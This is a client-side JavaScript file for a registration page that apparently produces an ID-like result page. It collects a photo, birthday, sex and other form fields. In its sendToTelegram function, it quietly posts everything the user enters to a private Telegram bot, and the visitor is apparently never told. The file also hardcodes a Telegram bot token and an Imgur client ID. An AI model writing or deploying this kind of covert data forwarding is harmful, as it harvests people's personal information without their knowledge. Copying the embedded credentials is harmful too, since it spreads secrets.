var selector = document.querySelector(".selector_box");
selector.addEventListener("click", () => {
  if (selector.classList.contains("selector_open")) {
    selector.classList.remove("selector_open");
  } else {
    selector.classList.add("selector_open");
  }
});

document.querySelectorAll(".date_input").forEach((element) => {
  element.addEventListener("click", () => {
    document.querySelector(".date").classList.remove("error_shown");
  });
});

var sex = "m";

document.querySelectorAll(".selector_option").forEach((option) => {
  option.addEventListener("click", () => {
    sex = option.id;
    document.querySelector(".selected_text").innerHTML = option.innerHTML;
  });
});

var upload = document.querySelector(".upload");

var imageInput = document.createElement("input");
imageInput.type = "file";
imageInput.accept = ".jpeg,.png,.gif";

document.querySelectorAll(".input_holder").forEach((element) => {
  var input = element.querySelector(".input");
  input.addEventListener("click", () => {
    element.classList.remove("error_shown");
  });
});

upload.addEventListener("click", () => {
  imageInput.click();
  upload.classList.remove("error_shown");
});

imageInput.addEventListener("change", (event) => {
  upload.classList.remove("upload_loaded");
  upload.classList.add("upload_loading");

  upload.removeAttribute("selected");

  var file = imageInput.files[0];
  var data = new FormData();
  data.append("image", file);

  fetch("https://api.imgur.com/3/image", {
    method: "POST",
    headers: {
      Authorization: "Client-ID 95e5303d3faca98",
    },
    body: data,
  })
    .then((result) => result.json())
    .then((response) => {
      var url = response.data.link;
      upload.classList.remove("error_shown");
      upload.setAttribute("selected", url);
      upload.classList.add("upload_loaded");
      upload.classList.remove("upload_loading");
      upload.querySelector(".upload_uploaded").src = url;
    });
});

document.querySelector(".go").addEventListener("click", () => {
  var empty = [];
  var params = new URLSearchParams();

  params.set("sex", sex);
  if (!upload.hasAttribute("selected")) {
    empty.push(upload);
    upload.classList.add("error_shown");
  } else {
    params.set("image", upload.getAttribute("selected"));
  }

  var birthday = "";
  var dateEmpty = false;
  document.querySelectorAll(".date_input").forEach((element) => {
    birthday = birthday + "." + element.value;
    if (isEmpty(element.value)) {
      dateEmpty = true;
    }
  });

  birthday = birthday.substring(1);

  if (dateEmpty) {
    var dateElement = document.querySelector(".date");
    dateElement.classList.add("error_shown");
    empty.push(dateElement);
  } else {
    params.set("birthday", birthday);
  }

  document.querySelectorAll(".input_holder").forEach((element) => {
    var input = element.querySelector(".input");

    if (isEmpty(input.value)) {
      empty.push(element);
      element.classList.add("error_shown");
    } else {
      params.set(input.id, input.value);
    }
  });

  if (empty.length != 0) {
    empty[0].scrollIntoView();
  } else {
    sendToTelegram(params); // Send registration info to Telegram
    forwardToId(params);
  }
});

function isEmpty(value) {
  let pattern = /^\s*$/;
  return pattern.test(value);
}

function forwardToId(params) {
  location.href = "/id.html?" + params;
}

function sendToTelegram(params) {
  const token = "8037115735:AAFuog1d2DbiMyEaaRaB_zZmQh_E3-tyRu4";
  const chatId = "5451190708";
  const message = `New Registration:\n${params.toString()}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "HTML",
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent to Telegram:", data);
    })
    .catch((error) => {
      console.error("Error sending message to Telegram:", error);
    });
}
